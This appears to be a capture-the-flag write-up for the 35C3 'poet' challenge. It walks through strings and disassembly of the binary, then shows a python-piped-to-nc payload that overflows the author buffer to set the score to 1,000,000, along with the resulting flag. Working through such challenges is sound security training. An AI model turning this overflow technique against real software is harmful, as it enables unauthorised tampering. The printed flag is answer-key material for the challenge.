# Challenge poet

44 Points

## Challenge

We are looking for the poet of the year:

nc 35.207.132.47 22223

Difficulty estimate: very easy

## Solution

A first analysis shows that the poet binary is a little game where you can enter a poem and and author and get points for it. The goal is to achieve 1'000'000 point. If we just run the program with some random values, we get 0 points:

```
root@blackbox:# ./poet

**********************************************************
* We are searching for the poet of the year 2018.        *
* Submit your one line poem now to win an amazing prize! *
**********************************************************

Enter the poem here:
> something
Who is the author of this poem?
> me

+---------------------------------------------------------------------------+
THE POEM
something
SCORED 0 POINTS.

SORRY, THIS POEM IS JUST NOT GOOD ENOUGH.
YOU MUST SCORE EXACTLY 1000000 POINTS.
TRY AGAIN!
+---------------------------------------------------------------------------+

```

After running "strings" on the assembly, there are some interesting strings defined in the binary:
```
root@blackbox:# strings poet
[...]
ESPR
sleep
repeat
capture
flag
[...]
```

If we use this words in the poem, we get 100 points for each word we use. Additionally, we can also use "eat" (which was not displayed in the string output, but worked anyway). But the problem is, even when we print "eat" (the smallest word) 10'000 times, we get a buffer overflow (seg fault). So the solution will contains some kind of buffer overflow. Maybe we can override the score with 1mio?

After looking at the strings output, 2 length definition of a printf or scanf can be found: %.64s and %.1024s, so maybe this is the length of the 2 variables for the poem and the author. In the disassembly of poet some interesting lines can be found:

```
## in the function get_poem: (load the destination address of the gets call)
40094a:	48 8d 3d 4f 17 20 00 	lea    rdi,[rip+0x20174f]        # 6020a0 <poem>

## in the function get_author: (load the destination address of the gets call)
40097a:	48 8d 3d 1f 1b 20 00 	lea    rdi,[rip+0x201b1f]        # 6024a0 <poem+0x400>

## in the function rate_poem: (add 100 point to the score)
40080c:	83 05 cd 1c 20 00 64 	add    DWORD PTR [rip+0x201ccd],0x64        # 6024e0 <poem+0x440>
```

The poem, the author and the score are saved in the same memory region, so lets try to overflow the author variable (since this variable is the nearest to the score) and put 1'000'000 (binary f4240 or 40420F - depending if the system is using big oder little endian) as score.

So do this, the input must first be a poet, followed by a newline character and then 64 characters (not important what character) to fill the buffer of "author". After that, we can put our payload (1'000'000 as HEX):
```
root@blackbox:# (python -c "print 'A\n' + 'A' * 64 + '\x40\x42\x0f'"; cat -) | nc 35.207.132.47 22223

**********************************************************
* We are searching for the poet of the year 2018.        *
* Submit your one line poem now to win an amazing prize! *
**********************************************************

Enter the poem here:
> Who is the author of this poem?
>
+---------------------------------------------------------------------------+
THE POEM
A
SCORED 1000000 POINTS.

CONGRATULATIONS

THE POET
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

RECEIVES THE AWARD FOR POET OF THE YEAR 2018!

THE PRIZE IS THE FOLLOWING FLAG:
35C3_f08b903f48608a14cbfbf73c08d7bdd731a87d39

+---------------------------------------------------------------------------+
```

And there we got the flag :confetti_ball:
